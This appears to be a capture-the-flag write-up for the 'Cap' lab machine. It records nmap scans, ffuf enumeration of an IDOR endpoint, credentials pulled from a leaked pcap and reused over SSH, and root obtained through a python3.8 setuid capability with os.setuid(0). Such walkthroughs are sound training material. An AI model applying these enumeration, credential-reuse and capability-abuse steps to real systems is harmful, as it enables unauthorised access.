# Cap
Easy level machine.

## Vulnerabilities in this machine
· IDOR
· Cleartext credentials
· Sensitive information leakage
· 'Cap-SetUID' Functionality

## Skills required
· **Web Enumeration (Fuzzing tools to find IDOR)**
· **PCAP file analysis**
· **Nmap Enumeration**
· **Linux Capability knowledge**

## Machine Content

This machine requires the attacker be familiar with IDOR vulnerabilities, PCAP files and Linux Capabilities (Cap-SetUID).

### Enumeration:

We start off with a simple nmap scan to see what we're up against.

```
nmap -p- -vvv MACHINE_IP

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 12:13 CEST
Initiating Ping Scan at 12:13
Scanning 10.10.10.245 [2 ports]
Completed Ping Scan at 12:13, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:13
Completed Parallel DNS resolution of 1 host. at 12:13, 2.05s elapsed
DNS resolution of 1 IPs took 2.05s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:13
Scanning 10.10.10.245 [65535 ports]
Discovered open port 80/tcp on 10.10.10.245
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
Increasing send delay for 10.10.10.245 from 0 to 5 due to max_successful_tryno increase to 4
Completed Connect Scan at 12:14, 44.05s elapsed (65535 total ports)
Nmap scan report for 10.10.10.245
Host is up, received syn-ack (0.044s latency).
Scanned at 2024-10-20 12:13:35 CEST for 44s
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 46.17 seconds

```
As we can see, we've found three ports, 21 for FTP, 22 for SSH and 80 for HTTP.

We can run another nmap scan with some basic scripts to find out some more info.

```
nmap -sCV MACHINE_IP -vvv

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-20 12:18 CEST
NSE: Loaded 156 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Initiating Ping Scan at 12:18
Scanning 10.10.10.245 [2 ports]
Completed Ping Scan at 12:18, 0.04s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 12:18
Completed Parallel DNS resolution of 1 host. at 12:18, 0.00s elapsed
DNS resolution of 1 IPs took 0.00s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 12:18
Scanning 10.10.10.245 [1000 ports]
Discovered open port 21/tcp on 10.10.10.245
Discovered open port 80/tcp on 10.10.10.245
Discovered open port 22/tcp on 10.10.10.245
Completed Connect Scan at 12:18, 0.66s elapsed (1000 total ports)
Initiating Service scan at 12:18
Scanning 3 services on 10.10.10.245
Completed Service scan at 12:20, 112.94s elapsed (3 services on 1 host)
NSE: Script scanning 10.10.10.245.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 15.66s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 1.09s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
Nmap scan report for 10.10.10.245
Host is up, received syn-ack (0.043s latency).
Scanned at 2024-10-20 12:18:44 CEST for 130s
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 3.0.3
22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH
80/tcp open  http    syn-ack gunicorn
|_http-server-header: gunicorn
|_http-title: Security Dashboard
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 NOT FOUND
|     Server: gunicorn
|     Date: Sun, 20 Oct 2024 10:18:16 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 232
|     <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 20 Oct 2024 10:18:11 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 19386
|     <!DOCTYPE html>
|     <html class="no-js" lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="x-ua-compatible" content="ie=edge">
|     <title>Security Dashboard</title>
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <link rel="shortcut icon" type="image/png" href="/static/images/icon/favicon.ico">
|     <link rel="stylesheet" href="/static/css/bootstrap.min.css">
|     <link rel="stylesheet" href="/static/css/font-awesome.min.css">
|     <link rel="stylesheet" href="/static/css/themify-icons.css">
|     <link rel="stylesheet" href="/static/css/metisMenu.css">
|     <link rel="stylesheet" href="/static/css/owl.carousel.min.css">
|     <link rel="stylesheet" href="/static/css/slicknav.min.css">
|     <!-- amchar
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Server: gunicorn
|     Date: Sun, 20 Oct 2024 10:18:11 GMT
|     Connection: close
|     Content-Type: text/html; charset=utf-8
|     Allow: OPTIONS, HEAD, GET
|     Content-Length: 0
|   RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|     Content-Type: text/html
|     Content-Length: 196
|     <html>
|     <head>
|     <title>Bad Request</title>
|     </head>
|     <body>
|     <h1><p>Bad Request</p></h1>
|     Invalid HTTP Version &#x27;Invalid HTTP Version: &#x27;RTSP/1.0&#x27;&#x27;
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port80-TCP:V=7.94SVN%I=7%D=10/20%Time=6714D90B%P=x86_64-pc-linux-gnu%r(
SF:GetRequest,1A8C,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:
SF:\x20Sun,\x2020\x20Oct\x202024\x2010:18:11\x20GMT\r\nConnection:\x20clos
SF:e\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x2
SF:019386\r\n\r\n<!DOCTYPE\x20html>\n<html\x20class=\"no-js\"\x20lang=\"en
SF:\">\n\n<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x2
SF:0\x20<meta\x20http-equiv=\"x-ua-compatible\"\x20content=\"ie=edge\">\n\
SF:x20\x20\x20\x20<title>Security\x20Dashboard</title>\n\x20\x20\x20\x20<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\x20\x20\x20\x20<link\x20rel=\"shortcut\x20icon\"\x20type=\"i
SF:mage/png\"\x20href=\"/static/images/icon/favicon\.ico\">\n\x20\x20\x20\
SF:x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/bootstrap\.min\.cs
SF:s\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css
SF:/font-awesome\.min\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"
SF:\x20href=\"/static/css/themify-icons\.css\">\n\x20\x20\x20\x20<link\x20
SF:rel=\"stylesheet\"\x20href=\"/static/css/metisMenu\.css\">\n\x20\x20\x2
SF:0\x20<link\x20rel=\"stylesheet\"\x20href=\"/static/css/owl\.carousel\.m
SF:in\.css\">\n\x20\x20\x20\x20<link\x20rel=\"stylesheet\"\x20href=\"/stat
SF:ic/css/slicknav\.min\.css\">\n\x20\x20\x20\x20<!--\x20amchar")%r(HTTPOp
SF:tions,B3,"HTTP/1\.0\x20200\x20OK\r\nServer:\x20gunicorn\r\nDate:\x20Sun
SF:,\x2020\x20Oct\x202024\x2010:18:11\x20GMT\r\nConnection:\x20close\r\nCo
SF:ntent-Type:\x20text/html;\x20charset=utf-8\r\nAllow:\x20OPTIONS,\x20HEA
SF:D,\x20GET\r\nContent-Length:\x200\r\n\r\n")%r(RTSPRequest,121,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nConnection:\x20close\r\nContent-Type:\x20
SF:text/html\r\nContent-Length:\x20196\r\n\r\n<html>\n\x20\x20<head>\n\x20
SF:\x20\x20\x20<title>Bad\x20Request</title>\n\x20\x20</head>\n\x20\x20<bo
SF:dy>\n\x20\x20\x20\x20<h1><p>Bad\x20Request</p></h1>\n\x20\x20\x20\x20In
SF:valid\x20HTTP\x20Version\x20&#x27;Invalid\x20HTTP\x20Version:\x20&#x27;
SF:RTSP/1\.0&#x27;&#x27;\n\x20\x20</body>\n</html>\n")%r(FourOhFourRequest
SF:,189,"HTTP/1\.0\x20404\x20NOT\x20FOUND\r\nServer:\x20gunicorn\r\nDate:\
SF:x20Sun,\x2020\x20Oct\x202024\x2010:18:16\x20GMT\r\nConnection:\x20close
SF:\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x20
SF:232\r\n\r\n<!DOCTYPE\x20HTML\x20PUBLIC\x20\"-//W3C//DTD\x20HTML\x203\.2
SF:\x20Final//EN\">\n<title>404\x20Not\x20Found</title>\n<h1>Not\x20Found<
SF:/h1>\n<p>The\x20requested\x20URL\x20was\x20not\x20found\x20on\x20the\x2
SF:0server\.\x20If\x20you\x20entered\x20the\x20URL\x20manually\x20please\x
SF:20check\x20your\x20spelling\x20and\x20try\x20again\.</p>\n");
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 12:20
Completed NSE at 12:20, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 130.57 seconds

```

We find a gunicorn server on port 80. If we put the machine IP on our browser we find a website.

Checking around this website leads us to a security snapshot where we can download a `.pcap` file.

Changing the ID number at the end of the URL yields a different user's data. We can use FFUF to enumerate more of these, like so:

```
seq 0 1000 | ffuf -u 'http://10.10.10.245/data/FUZZ' -c -w - -fw 21

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.245/data/FUZZ
 :: Wordlist         : FUZZ: -
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 21
________________________________________________

1                       [Status: 200, Size: 17144, Words: 7066, Lines: 371, Duration: 57ms]
22                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 61ms]
14                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 74ms]
15                      [Status: 200, Size: 17151, Words: 7066, Lines: 371, Duration: 77ms]
12                      [Status: 200, Size: 17151, Words: 7066, Lines: 371, Duration: 80ms]
11                      [Status: 200, Size: 17151, Words: 7066, Lines: 371, Duration: 102ms]
0                       [Status: 200, Size: 17147, Words: 7066, Lines: 371, Duration: 115ms]
10                      [Status: 200, Size: 17151, Words: 7066, Lines: 371, Duration: 185ms]
29                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 203ms]
32                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 204ms]
30                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 205ms]
16                      [Status: 200, Size: 17151, Words: 7066, Lines: 371, Duration: 208ms]
33                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 201ms]
31                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 207ms]
21                      [Status: 200, Size: 17145, Words: 7066, Lines: 371, Duration: 163ms]
17                      [Status: 200, Size: 17151, Words: 7066, Lines: 371, Duration: 342ms]


```

Here we see a few `.pcap` files we can download. If we download the `.pcap` file from id 0, we will find a username and password within it.
![Screenshot at 2024-10-20 12-37-56](https://github.com/user-attachments/assets/255870ff-faf2-4d9c-a1af-289a3a84b9d4)

## Penetration

The protocol we see these credentials used on is FTP, but if we try them on ssh like so:

```
ssh nathan@MACHINE_IP
```
We'll find it will allow us in. With this we can get our first flag, `user.txt`.

## Privilege Escalation

If we ls, we can find the `linpeas.sh` script. Running it will yield a get.UID capability on the system.

Knowing this we can run python3.8 and then use `os.setuid(0)` to run commands as root and then give ourselves a root shell with `os.system("bash")`.

![Screenshot at 2024-10-20 12-50-03](https://github.com/user-attachments/assets/2e9ddff2-015e-4b0b-9da4-36d12b762cfc)

And we can then cat out our flag.


